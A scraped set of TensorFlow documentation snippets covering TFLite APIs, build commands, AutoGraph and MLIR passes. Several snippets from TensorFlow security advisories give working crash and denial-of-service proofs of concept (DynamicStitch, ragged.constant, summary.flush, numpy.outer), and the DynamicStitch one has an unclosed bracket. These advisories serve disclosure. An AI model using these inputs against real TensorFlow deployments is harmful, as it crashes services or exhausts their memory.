   cuda_redist_path_prefix = "file:///home/usr/Downloads/dists/",
)

cudnn_redist_init_repository(
   cudnn_redistributions = _CUSTOM_CUDNN_REDISTRIBUTIONS,
   cudnn_redist_path_prefix = "file:///home/usr/Downloads/dists/cudnn/"
)
```

----------------------------------------

TITLE: Get Root FeatureProperties Object in Python
DESCRIPTION: This class method gets the root object of a `FeatureProperties` FlatBuffer from a buffer. It's the primary way to deserialize the data into a Python object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/FeatureProperties.md#_snippet_1

LANGUAGE: python
CODE:
```
@classmethod
GetRootAs(
    buf, offset=0
)
```

----------------------------------------

TITLE: Accessing Associated Files Metadata in Python
DESCRIPTION: Accesses a specific entry in the list of associated files metadata. This method is typically used to retrieve metadata for a particular associated file by its index.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadata.md#_snippet_0

LANGUAGE: python
CODE:
```
AssociatedFiles(
    j
)
```

----------------------------------------

TITLE: Specifying TensorFlow Compatibility Versions Python
DESCRIPTION: This class variable indicates the TensorFlow major versions that are compatible with this specific recommendation model specification within the TFLite Model Maker library. It helps users understand the required TensorFlow environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/recommendation/ModelSpec.md#_snippet_3

LANGUAGE: python
CODE:
```
[2]
```

----------------------------------------

TITLE: Accessing Model-Level Debug Statistics (Python)
DESCRIPTION: Accesses the overall model-level debug statistics calculated by the debugger. This property is populated if `model_debug_metrics` were provided during debugger initialization and is useful for getting a single aggregated metric for the entire model's output difference.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_23

LANGUAGE: python
CODE:
```
debugger.model_statistics
```

----------------------------------------

TITLE: Getting Embedding Dimension TFLite AudioEmbedder Python
DESCRIPTION: Retrieves the dimensionality (size) of the embedding vector produced by a specific output layer of the model. Takes the output layer index as input and returns an integer representing the dimension, or -1 if the index is invalid.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioEmbedder.md#_snippet_7

LANGUAGE: python
CODE:
```
get_embedding_dimension(
    output_index: int
) -> int
```

----------------------------------------

TITLE: Getting Unpopulated Metadata JSON (Python)
DESCRIPTION: Retrieves the generated JSON string representing the metadata buffer *before* it has been populated into the model file. This shows the raw metadata structure created by the MetadataWriter. Use get_populated_metadata_json() to see the final metadata string after population, which may include additional fields like min_parser_version added by MetadataPopulator.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/audio_classifier/metadata_writer/MetadataWriter.md#_snippet_3

LANGUAGE: python
CODE:
```
get_metadata_json() -> str
```

----------------------------------------

TITLE: Dump Quantization Debugger Results to CSV Python
DESCRIPTION: Saves the collected layer-wise quantization statistics from the debugger to a CSV file located at the specified `RESULTS_FILE` path. This allows for persistent storage and external analysis of the debugging output.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_8

LANGUAGE: Python
CODE:
```
RESULTS_FILE = '/tmp/debugger_results.csv'
with open(RESULTS_FILE, 'w') as f:
  debugger.layer_statistics_dump(f)
```

----------------------------------------

TITLE: Running TensorFlow Custom Op Tests with Bazel (Shell)
DESCRIPTION: This command uses the Bazel build tool to run the `simple_hash_table_test` target defined in the `BUILD` file. It executes the tests for the custom hash table operation, verifying its functionality and integration within TensorFlow. The output indicates the test results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/simple_hash_table/README.md#_snippet_22

LANGUAGE: Shell
CODE:
```
$ bazel test //third_party/tensorflow/google/g3doc/example/simple_hash_table:simple_hash_table_test
```

----------------------------------------

TITLE: Demonstrating DynamicStitch Vulnerability (Python)
DESCRIPTION: This Python code snippet attempts to call `tf.raw_ops.DynamicStitch` with an invalid number of inputs to demonstrate the vulnerability. It provides one tensor in the `indices` list and two tensors in the `data` list, violating the `N` constraint defined during registration and leading to an out-of-bounds access and segmentation fault.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-145.md#_snippet_1

LANGUAGE: Python
CODE:
```
import tensorflow as tf

# indices = 1*[tf.random.uniform([1,2], dtype=tf.dtypes.int32, maxval=100)]
indices = [tf.constant([[0, 1]]),

# data = 2*[tf.random.uniform([1,2], dtype=tf.dtypes.float32, maxval=100)]
data = [tf.constant([[5, 6]]), tf.constant([[7, 8]])]

tf.raw_ops.DynamicStitch(
    indices=indices,
    data=data)
```

----------------------------------------

TITLE: Get Default Quantization Config Method Python
DESCRIPTION: Retrieves the default quantization configuration for the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/BertClassifierSpec.md#_snippet_5

LANGUAGE: python
CODE:
```
get_default_quantization_config()
```

----------------------------------------

TITLE: Defining TensorFlow Model with Signatures - Python
DESCRIPTION: Defines a TensorFlow Module subclass with methods decorated as tf.function, specifying input signatures using tf.TensorSpec. Each method ('encode', 'decode') represents a distinct signature with defined inputs and outputs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/signatures.ipynb#_snippet_1

LANGUAGE: Python
CODE:
```
class Model(tf.Module):

  @tf.function(input_signature=[tf.TensorSpec(shape=[None], dtype=tf.float32)])
  def encode(self, x):
    result = tf.strings.as_string(x)
    return {
         "encoded_result": result
    }

  @tf.function(input_signature=[tf.TensorSpec(shape=[None], dtype=tf.string)])
  def decode(self, x):
    result = tf.strings.to_number(x)
    return {
         "decoded_result": result
    }
```

----------------------------------------

TITLE: Initial TPU Program Layout MLIR
DESCRIPTION: Example showing a basic TensorFlow TPU program structure in MLIR before applying the dynamic layout pass. It involves getting input (`tf.IteratorGetNext`), compiling (`tf._TPUCompileMlir`), and executing (`tf.TPUExecute`), with a potential implicit fixed layout copy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_53

LANGUAGE: mlir
CODE:
```
  %input = "tf.IteratorGetNext"(...) {device = "/CPU:0"}
  %compile:2 = "tf._TPUCompileMlir"(...)
  %execute = "tf.TPUExecute"(%input, ..., %compile#1) {device = "/TPU:0"}
```

----------------------------------------

TITLE: Getting Populated TFLite Metadata JSON (Python)
DESCRIPTION: This method returns the complete metadata as a JSON string after it has been populated into the TFLite model file, including fields added by the MetadataPopulator like `min_parser_version`. Use `get_metadata_json` to see the original metadata before population. It returns the final JSON string.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/image_segmenter/MetadataWriter.md#_snippet_5

LANGUAGE: Python
CODE:
```
get_populated_metadata_json() -> str
```

----------------------------------------

TITLE: Comparing Eager vs. Graph Semantics without AutoGraph Python
DESCRIPTION: Compares the execution of a function with a conditional using a `tf.Tensor` argument in Eager mode versus using `tf.function` *without* AutoGraph (`autograph=False`), demonstrating that standard Python control flow often fails in graph mode when using Tensors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/intro.md#_snippet_4

LANGUAGE: Python
CODE:
```
def f(x):
  if x > 0:
    return x
  return -x

# Use tf.function to run code as a TensorFlow Graph.
unconverted_graph_f = tf.function(f, autograph=False)
graph_f = tf.function(f, autograph=True)
```

----------------------------------------

TITLE: Generating and Evaluating Model with Node Denylist (Python)
DESCRIPTION: Generates a TFLite model where the nodes specified in the denylist are kept in their original floating-point format. The resulting selective quantized model is then evaluated using a helper function to assess its accuracy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
selective_quantized_model = debugger.get_nondebug_quantized_model()
eval_tflite(selective_quantized_model, ds)
```

----------------------------------------

TITLE: Loading and Splitting Data Simple Example Python
DESCRIPTION: Loads image data from the specified folder using DataLoader.from_folder, assuming subdirectories are class labels. It then splits the loaded data into training (90%) and testing (10%) sets for the simple end-to-end example.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/image_classification.ipynb#_snippet_3

LANGUAGE: python
CODE:
```
data = DataLoader.from_folder(image_path)
train_data, test_data = data.split(0.9)
```

----------------------------------------

TITLE: Specifying Include Directories for Test Executable (CMake)
DESCRIPTION: Adds required directories to the include path for the `aot_compiled_test` target. These paths include a location for generated model headers, the include directory within the TensorFlow package installation, and a directory for third-party headers necessary for building against TensorFlow components.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/tools/pip_package/xla_build/pip_test/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
target_include_directories(aot_compiled_test PUBLIC
        "/tmp/generated_models"
        "${TENSORFLOW_PACKAGE_PATH}/include"
        "/tmp/tf_third_party")
```

----------------------------------------

TITLE: Obtaining TFLite Micro Input Tensor Pointer (C++)
DESCRIPTION: Retrieves a pointer to the model's input tensor using `interpreter.input(0)`. The index `0` indicates the first input tensor. This pointer provides access to the memory location where input data must be placed before executing the model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/microcontrollers/get_started_low_level.md#_snippet_11

LANGUAGE: C++
CODE:
```
  // Obtain a pointer to the model's input tensor
  TfLiteTensor* input = interpreter.input(0);
```

----------------------------------------

TITLE: Using Custom Multiplexer Op with Example Data in Python
DESCRIPTION: Provides a concrete example of how to use the custom `multiplex` operation in a Python script. It imports the op, calls it with sample boolean, integer, and float tensors, and then retrieves the result as a NumPy array.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/examples/custom_ops_doc/multiplex_1/README.md#_snippet_1

LANGUAGE: python
CODE:
```
from tensorflow.examples.custom_ops_doc.multiplex_1 import multiplex_1_op

m = multiplex_1_op.multiplex([True, False, False, True], [1,2,3,4], [100,200,300,400])
m.numpy()
```

----------------------------------------

TITLE: Running Hexagon Delegate Tests via Script - Bash
DESCRIPTION: This command executes the run_tests.sh script located in the tensorflow/lite/delegates/hexagon/builders/tests/ directory. It requires the path to the directory containing the Hexagon skeleton files (libhexagon_nn_skel*.so) as an argument. The script is used to copy necessary files to the device, build the tests, and execute them.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/delegates/hexagon/builders/tests/README.md#_snippet_0

LANGUAGE: bash
CODE:
```
bash tensorflow/lite/delegates/hexagon/builders/tests/run_tests.sh /tmp/hexagon_skel
```

----------------------------------------

TITLE: Populating Loaded Metadata and Files into TFLite Model - Python
DESCRIPTION: This method performs the final action of embedding the previously loaded metadata and associated files into the target TensorFlow Lite model. The target model was specified when the MetadataPopulator instance was created using either the with_model_buffer or with_model_file class method. This operation modifies the internal model representation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_11

LANGUAGE: Python
CODE:
```
populate()
```

----------------------------------------

TITLE: Using tf.TensorArray in AutoGraph Loop Python
DESCRIPTION: Demonstrates the correct way to handle dynamically sized collections within TensorFlow control flow (like loops converted by AutoGraph). Using `tf.TensorArray` allows adding elements (`write`) inside the loop as it is designed for graph execution. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/limitations.md#_snippet_27

LANGUAGE: Python
CODE:
```
l = tf.TensorArray(tf.int32, size=0, dynamic_size=True)
for i in tf.range(10):
  l = l.write(l.size(), i)  # Okay
```

----------------------------------------

TITLE: AutoGraph If/Else Statement Transformation Example
DESCRIPTION: Illustrates how a standard Python if/else statement is transformed into AutoGraph operator calls. The generated code uses functions (thunks) for the body and else branches, and explicit state management functions (`get_state`, `set_state`) to handle variable updates across the conditional boundary.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/operators.md#_snippet_0

LANGUAGE: Python
CODE:
```
if x:
  y = 1
else:
  y = 2
```

LANGUAGE: Python
CODE:
```
def get_state():
    return (y,)

def set_state(vars_):
    nonlocal y
    (y,) = vars_

def if_body():
    nonlocal y
    y = 1

def else_body():
    nonlocal y
    y = 2
y = ag__.Undefined('y')
ag__.if_stmt(ag__.ld(x), if_body, else_body, get_state, set_state, ('y',), 1)
```

----------------------------------------

TITLE: Demonstrating Denial of Service in tf.ragged.constant (Python)
DESCRIPTION: This Python snippet demonstrates how to trigger the denial of service vulnerability in `tf.ragged.constant`. By providing an excessively large value for `ragged_rank` with an empty `pylist`, the function fails to validate the input correctly, leading to a denial of service by consuming all available memory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-079.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf
tf.ragged.constant(pylist=[],ragged_rank=8968073515812833920)
```

----------------------------------------

TITLE: Creating Metadata | InputImageTensorMd | Python
DESCRIPTION: Generates a Flatbuffers Python object representing the input image tensor metadata based on the information stored in the `InputImageTensorMd` instance. This method is used to serialize the metadata into a format suitable for embedding within a TFLite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/metadata_info/InputImageTensorMd.md#_snippet_1

LANGUAGE: python
CODE:
```
create_metadata() -> <a href="../../../tflite_support/metadata_schema_py_generated/TensorMetadataT"><code>tflite_support.metadata_schema_py_generated.TensorMetadataT</code></a>
```

----------------------------------------

TITLE: Converting SavedModel to TFLite in Python
DESCRIPTION: This snippet demonstrates how to convert a TensorFlow SavedModel directory into a TensorFlow Lite model using `tf.compat.v1.lite.TFLiteConverter.from_saved_model`. It loads the SavedModel from a specified directory, converts it, and saves the resulting TFLite model to a file.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/r1/convert/python_api.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

# Convert the model.
converter = tf.compat.v1.lite.TFLiteConverter.from_saved_model(saved_model_dir)
tflite_model = converter.convert()

# Save the model.
with open('model.tflite', 'wb') as f:
  f.write(tflite_model)
```

----------------------------------------

TITLE: Building TFLite Native Benchmark Binary (Android NDK) - Bazel Shell
DESCRIPTION: Builds the native TensorFlow Lite benchmark command-line binary specifically for an Android target architecture (e.g., `android_arm64`) using Bazel and the Android NDK toolchain. The `--config` flag specifies the target build configuration. This requires setting up the Android NDK build environment.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_4

LANGUAGE: Shell
CODE:
```
bazel build -c opt --config=android_arm64 \
  //tensorflow/lite/tools/benchmark:benchmark_model
```

----------------------------------------

TITLE: Adding FFTSG Library Target and Linking Math CMake
DESCRIPTION: Defines the static library target `fft2d_fftsg` from its source file. It conditionally links the system math library (`m`) to this target on systems that are not Windows, as `fftsg` likely requires math functions.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/tools/cmake/modules/fft2d/CMakeLists.txt#_snippet_4

LANGUAGE: CMake
CODE:
```
add_library(fft2d_fftsg "${FFT2D_SOURCE_DIR}/fftsg.c")
if(NOT CMAKE_SYSTEM_NAME STREQUAL Windows)
target_link_libraries(fft2d_fftsg m)
endif()
```

----------------------------------------

TITLE: Plotting 16x8 Quantized TFLite Model Prediction Result Python
DESCRIPTION: Uses Matplotlib to display the test image used for inference with the 16x8 quantized TFLite model. It sets the plot title to show the true label and the digit predicted by the quantized model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant_16x8.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
plt.imshow(test_images[0])
template = "True:{true}, predicted:{predict}"
_ = plt.title(template.format(true= str(test_labels[0]),
                              predict=str(np.argmax(predictions[0]))))
plt.grid(False)
```

----------------------------------------

TITLE: Building XLA Multi-Host Runner with CUDA and NCCL Bash
DESCRIPTION: These commands navigate to the XLA source directory (`/opt/xla/`) and then configure and build the `hlo_runner_main` tool using Bazel, enabling the CUDA backend and NCCL support. This is a necessary build step before running the tool.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/tools_multihost_hlo_runner.md#_snippet_4

LANGUAGE: bash
CODE:
```
cd /opt/xla/
./configure.py --backend CUDA --nccl
bazel build //xla/tools/multihost_hlo_runner:hlo_runner_main
```

----------------------------------------

TITLE: Defining Public TableGen Build Target (CMake)
DESCRIPTION: Creates a public CMake build target named `MLIRDeallocationPassesIncGen`. This target represents the output of a TableGen command (like the previous snippet) and can be depended upon by other build targets, ensuring the generated files are available before compilation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/deallocation/transforms/CMakeLists.txt#_snippet_2

LANGUAGE: CMake
CODE:
```
add_public_tablegen_target(MLIRDeallocationPassesIncGen)
```

----------------------------------------

TITLE: Profiling Time by Operation Type (tfprof)
DESCRIPTION: This tfprof command profiles model execution time, aggregating it by the type of TensorFlow operation. It selects `micros` (total execution time) and `occurrence` (number of times the op type appears), orders the results by total execution time, showing which operation types consume the most time.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_time.md#_snippet_4

LANGUAGE: tfprof
CODE:
```
tfprof> op -select micros,occurrence -order_by micros
```

----------------------------------------

TITLE: Getting Input Tensor Names from TFLite Model Buffer in Python
DESCRIPTION: This Python function `get_input_tensor_names` takes a byte array representing a TFLite model and returns a list of strings, where each string is the name of an input tensor. It requires the model buffer as a bytearray object. The expected output is a list of strings representing the tensor names.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_writers/writer_utils/get_input_tensor_names.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.metadata_writers.writer_utils.get_input_tensor_names(
    model_buffer: bytearray
) -> List[str]
```

----------------------------------------

TITLE: Adding Output Tensor Groups to SubGraphMetadata in Python
DESCRIPTION: This snippet shows the signature of the `SubGraphMetadataAddOutputTensorGroups` function. This function is used when programmatically building metadata for a TensorFlow Lite model's subgraph using FlatBuffers, specifically to associate groups of output tensors with the subgraph metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/SubGraphMetadataAddOutputTensorGroups.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.SubGraphMetadataAddOutputTensorGroups(
    builder, outputTensorGroups
)
```

----------------------------------------

TITLE: Loading Metadata from File for Population - Python
DESCRIPTION: This method loads metadata content from a specified file path into the MetadataPopulator object, preparing it to be embedded in the TensorFlow Lite model. It checks if the file exists and validates the metadata content similar to loading from a buffer. It raises IOError if the file is not found and ValueError for invalid metadata content.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata/MetadataPopulator.md#_snippet_10

LANGUAGE: Python
CODE:
```
load_metadata_file(
    metadata_file
)
```

----------------------------------------

TITLE: Splitting DataLoader Dataset (Python)
DESCRIPTION: Divides the encapsulated dataset into two `DataLoader` objects based on a specified `fraction`. The first returned object contains `fraction` percent of the data, and the second contains the remainder, enabling standard data splits like train/test or train/validation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/question_answer/DataLoader.md#_snippet_3

LANGUAGE: Python
CODE:
```
split(
    fraction
)
```

----------------------------------------

TITLE: Install OpenCV Python Library
DESCRIPTION: Installs the `opencv-python` library using pip in a quiet mode (`-q`). This library is necessary for image processing tasks, such as reading and manipulating images, which are part of the data preprocessing steps in the tutorial.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_0

LANGUAGE: Shell
CODE:
```
!pip install -q opencv-python
```

----------------------------------------

TITLE: Ending Tensor Group Definition in TFLite Metadata (Python)
DESCRIPTION: This snippet presents the function signature for `TensorGroupEnd`. It's a function within the TFLite Support library used to indicate the end of a tensor group definition when building model metadata. It requires a `builder` object, typically used for serializing the metadata structure.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/metadata_schema_py_generated/TensorGroupEnd.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.metadata_schema_py_generated.TensorGroupEnd(
    builder
)
```

----------------------------------------

TITLE: Initializing TensorFlow Lite Classifiers - Kotlin
DESCRIPTION: Initializes either a `BertNLClassifier` or `NLClassifier` instance based on the selected model (`currentModel`). It loads the model file from assets using the provided context and configuration options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_4

LANGUAGE: Kotlin
CODE:
```
fun initClassifier() {
  ...
  if( currentModel == MOBILEBERT ) {
    ...
    bertClassifier = BertNLClassifier.createFromFileAndOptions(
      context,
      MOBILEBERT,
      options)
  } else if (currentModel == WORD_VEC) {
      ...
      nlClassifier = NLClassifier.createFromFileAndOptions(
        context,
        WORD_VEC,
        options)
  }
}
```

----------------------------------------

TITLE: Comparing SegmentationResult Objects in TensorFlow Lite Support Python
DESCRIPTION: Checks if the current `SegmentationResult` object is equal to another object. It takes an `other` object as input and returns `True` if they are equal, `False` otherwise. This method is used for equality comparisons between `SegmentationResult` instances.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/processor/SegmentationResult.md#_snippet_1

LANGUAGE: python
CODE:
```
__eq__(
    other: Any
) -> bool
```

----------------------------------------

TITLE: Listing ResNet TFLite Files and Sizes Shell
DESCRIPTION: Executes a shell command (!ls -lh) within the notebook environment to list the ResNet TFLite files ending with .tflite in the specified directory, displaying their sizes in a human-readable format to show the effect of quantization on this larger model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quant.ipynb#_snippet_18

LANGUAGE: shell
CODE:
```
!ls -lh {tflite_models_dir}/*.tflite
```

----------------------------------------

TITLE: Binding XLA FFI Handler with Fixed and Variadic Parameters
DESCRIPTION: Shows the correct order for defining a mixed signature XLA FFI handler: fixed arguments/results must be declared before variadic ones (`RemainingArgs`/`RemainingRets`). Binding fixed parameters after variadic ones is not allowed.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/docs/custom_call.md#_snippet_6

LANGUAGE: C++
CODE:
```
auto handler =
    Ffi::Bind()
        .Arg<AnyBuffer>()
        .RemainingArgs()
        .Ret<AnyBuffer>()
        .RemainingRets()
        .To([](AnyBuffer arg, RemainingArgs args, AnyBuffer ret,
               RemainingRets results) -> Error { return Error::Success(); });
```

----------------------------------------

TITLE: Demonstrating Invalid Summary Writer in TensorFlow Python
DESCRIPTION: This Python snippet demonstrates the vulnerability by calling the `tf.summary.flush` operation with an invalid, empty tuple `()` supplied as the `writer`. In vulnerable versions of TensorFlow's eager mode, this input triggers undefined behavior.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-072.md#_snippet_1

LANGUAGE: python
CODE:
```
import tensorflow as tf

tf.summary.flush(writer=())
```

----------------------------------------

TITLE: Creating TensorFlow Lite ObjectDetector Instance (Kotlin)
DESCRIPTION: Instantiates the `ObjectDetector` object by providing the Android `context`, the selected `modelName` from the assets directory, and the configured `optionsBuilder.build()`. This initialized object is ready to perform object detection inference. Requires the `tensorflow-lite-task-vision` dependency and a valid Android `Context`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/object_detection.md#_snippet_6

LANGUAGE: Kotlin
CODE:
```
objectDetector =
  ObjectDetector.createFromFileAndOptions(
    context, modelName, optionsBuilder.build())
```

----------------------------------------

TITLE: Initializing AudioClassifier Python
DESCRIPTION: Initializes the AudioClassifier class. This constructor is typically used internally; users should prefer the class methods `create_from_file` or `create_from_options` for creating instances. It requires configuration options and an internal C++ classifier object.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/AudioClassifier.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.audio.AudioClassifier(
    options: <a href="../../../tflite_support/task/audio/AudioClassifierOptions"><code>tflite_support.task.audio.AudioClassifierOptions</code></a>,
    classifier: _CppAudioClassifier
) -> None
```

----------------------------------------

TITLE: Checking Executable Link Libraries (CMake)
DESCRIPTION: Performs a final check on the `mlir-hlo-opt` target to verify that all required symbols are provided by the linked libraries. This validation step helps identify potential linking issues early in the build configuration process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/third_party/xla/xla/mlir_hlo/tools/mlir-hlo-opt/CMakeLists.txt#_snippet_5

LANGUAGE: CMake
CODE:
```
mlir_check_all_link_libraries(mlir-hlo-opt)
```

----------------------------------------

TITLE: Running All CPU Tests using CI Scripts - Bash
DESCRIPTION: Uses the `ci_build.sh` script to build and run all CPU Bazel tests for TensorFlow. This method leverages TensorFlow's CI infrastructure and Docker to provide a consistent and isolated test environment. Requires Docker installed on the host system.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/CONTRIBUTING.md#_snippet_13

LANGUAGE: bash
CODE:
```
# Install Docker first, then this will build and run cpu tests
tensorflow/tools/ci_build/ci_build.sh CPU bazel test //tensorflow/...
```

----------------------------------------

TITLE: Demonstrating TensorFlow BCast Overflow in Python
DESCRIPTION: This Python snippet demonstrates the TFSA-2022-153 vulnerability. It creates a large tensor shape exceeding `int32` limits and passes it to `tf.experimental.numpy.outer`, which triggers the `BCast::ToShape` overflow and causes a `CHECK` failure. Requires TensorFlow.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/security/advisory/tfsa-2022-153.md#_snippet_0

LANGUAGE: python
CODE:
```
import tensorflow as tf

value = tf.constant(shape=[2, 1024, 1024, 1024], value=False)

tf.experimental.numpy.outer(a=6,b=value)
```

----------------------------------------

TITLE: Initializing TensorAudio Class in Python
DESCRIPTION: Initializes a new instance of the `TensorAudio` class. This constructor sets up the internal buffer based on the provided audio format and specified buffer size.
It requires an `AudioFormat` object detailing the audio properties and an integer for the desired buffer size.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/audio/TensorAudio.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_support.task.audio.TensorAudio(
    audio_format: tflite_support.task.audio.AudioFormat,
    buffer_size: int
) -> None
```

----------------------------------------

TITLE: Disabling TensorFlow Lite Internal Tracing using adb
DESCRIPTION: This shell command uses `adb shell setprop` to set the Android system property `debug.tflite.trace` back to `0`. This disables the internal TensorFlow Lite event tracing mechanism that was previously enabled, stopping the emission of TFLite-specific trace events.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/measurement.md#_snippet_9

LANGUAGE: Shell
CODE:
```
adb shell setprop debug.tflite.trace 0
```

----------------------------------------

TITLE: Canonicalizing TF Compilation/Replication Attributes MLIR
DESCRIPTION: Illustrates the transformation of legacy `_tpu_replicate` and `_XlaMustCompile` attributes to unified `_replication_info` and `_xla_compile_device_type` attributes on `tf_executor.island` and `tf.PartitionedCall` ops for TensorFlow MLIR.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/compiler/mlir/g3doc/_includes/tf_passes.md#_snippet_0

LANGUAGE: MLIR
CODE:
```
%control = tf_executor.island wraps "tf.TPUReplicateMetadata"() {_tpu_replicate = "cluster", allow_soft_placement = false, computation_shape = [], device = "", device_assignment = [], host_compute_core = [], name = "TPUReplicateMetadata", num_cores_per_replica = 1 : i64, num_replicas = 1 : i64, step_marker_location = "STEP_MARK_AT_ENTRY", topology = "", use_tpu = true, use_spmd_for_xla_partitioning = false} : () -> ()

```

LANGUAGE: MLIR
CODE:
```
%control = tf_executor.island wraps "tf.TPUReplicateMetadata"() {_replication_info = "cluster", _xla_compile_device_type = "TPU", allow_soft_placement = false, computation_shape = [], device = "", device_assignment = [], host_compute_core = [], name = "TPUReplicateMetadata", num_cores_per_replica = 1 : i64, num_replicas = 1 : i64, step_marker_location = "STEP_MARK_AT_ENTRY", topology = "", use_spmd_for_xla_partitioning = false, use_tpu = true} : () -> ()

```

LANGUAGE: MLIR
CODE:
```
%outputs_67, %control_68 = tf_executor.island wraps "tf.PartitionedCall"(%arg0, %outputs_0) {_XlaMustCompile = true, _collective_manager_ids = [], _read_only_resource_inputs = [], config = "", config_proto = "\0A\07\0A\03CPU\10\01\0A\07\0A\03GPU\10\00\0A\07\0A\03TPU\10\02\0A\0E\0A\0ATPU_SYSTEM\10\012\02J\008\01\82\01\05h\01\88\01\01", device = "", executor_type = "", f = @__inference__jit_compiled_convolution_op_1510} : (tensor<4x32x32x8xf32>, tensor<*xf32>) -> tensor<*xf32>

```

LANGUAGE: MLIR
CODE:
```
